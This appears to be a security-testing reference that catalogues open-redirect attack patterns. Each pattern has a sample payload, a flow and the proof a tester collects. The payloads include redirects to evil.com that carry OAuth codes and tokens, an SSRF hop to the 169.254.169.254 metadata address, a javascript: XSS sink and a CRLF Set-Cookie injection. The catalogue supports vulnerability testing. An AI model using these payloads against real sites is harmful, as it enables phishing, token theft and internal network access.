# Attack shapes — the canonical open-redirect exploits

## Shape 1 — the standalone phishing launder

```text
https://target.com/login?next=https://evil.com
  -> the victim clicks a "target.com" link
  -> target.com 302s -> lands on evil.com
  -> evil.com mimics target.com -> captures credentials
the deliverable: the verbatim Location: https://evil.com
```

## Shape 2 — the OAuth code-launder

```text
redirect_uri = https://allowlisted.com/redirect?next=https://evil.com
  -> the OAuth server redirects to the allowlisted URL
  -> the allowlisted open-redirect -> evil.com
  -> evil.com?code=<the-auth-code> or #access_token=<token>
the deliverable: the code/token on the canary's access log
```

## Shape 3 — the SSRF fetch-follow

```text
/fetch?url=https://target.com/redirect%3Fnext%3Dhttp://169.254.169.254/
  -> the fetcher fetches target.com/redirect (allowlisted)
  -> follows the Location -> reaches the internal host
the deliverable: the internal content in the fetcher's response
```

## Shape 4 — the XSS scheme-sink

```text
?next=javascript:alert(1)  -> location.href="javascript:alert(1)"
  -> a DOM-sink accepting the scheme -> the XSS fires
the deliverable: the sink-value + the browser's fire
```

## Shape 5 — the bot-visit launder

```text
report-URL: https://target.com/redirect?next=https://evil.com
  -> the bot visits the target.com URL -> 302s -> lands on evil.com
  -> evil.com serves the attacker's content
the deliverable: the bot's visit on the canary log
```

## Shape 6 — the CRLF header-split

```text
?next=%2f%0d%0aSet-Cookie:%20session%3Dinjected
  -> the Location: header carries a CRLF -> splits into a Set-Cookie
the deliverable: the second header in the verbatim response
```

## Shape 7 — the stored-redirect

```text
step 1: /set-next?next=https://evil.com  -> stored
step 2: /login -> 302 to the stored next -> evil.com
the deliverable: the Location on the FIRE-step
```

## Shape 8 — the Referer-derived

```text
GET /back  Referer: https://evil.com  -> Location: https://evil.com
the deliverable: the Location carrying the forged Referer
```

## Shape 9 — the token-in-fragment launder

```text
the OAuth implicit flow: Location: https://evil.com#access_token=<token>
the deliverable: the #access_token the canary's JS reads
```

## Shape 10 — the Referer-leak

```text
the redirect lands the victim on evil.com; the Referer the victim's
browser sends carries the ORIGINATING URL with a token/code
the deliverable: the Referer header the canary receives
```

## Shape 11 — the deep-link / QR launder

```text
/qr?url=https://evil.com  -> a generated QR code -> the scanned URL
/deeplink?target=https://evil.com  -> a deep-link to evil.com
the deliverable: the generated URL/QR carrying the canary
```

## Shape 12 — the multi-hop redirect-chain

```text
target.com/r1?next=/r2?next=//evil.com  -> r1->r2->evil.com
the deliverable: the chain's final Location: //evil.com
```

## The shape-to-class matrix

| The shape | The class | The oracle |
|---|---|---|
| the phishing launder | open-redirect | `Location: <canary>` |
| the OAuth launder | open-redirect -> oauth-sso | the code on the canary |
| the SSRF-follow | open-redirect -> ssrf | the internal content |
| the XSS scheme-sink | open-redirect -> xss | the sink-value + the fire |
| the bot-visit | open-redirect -> bot | the bot's visit log |
| the CRLF split | open-redirect -> header-inj | the split headers |
| the stored-redirect | open-redirect | the Location on the fire-step |
| the Referer-derived | open-redirect | the forged-Referer Location |
| the token-fragment | open-redirect -> oauth-sso | the #access_token |
| the Referer-leak | open-redirect -> info-discl | the Referer on the canary |
| the deep-link | open-redirect | the generated URL |
| the multi-hop | open-redirect | the chain's final Location |
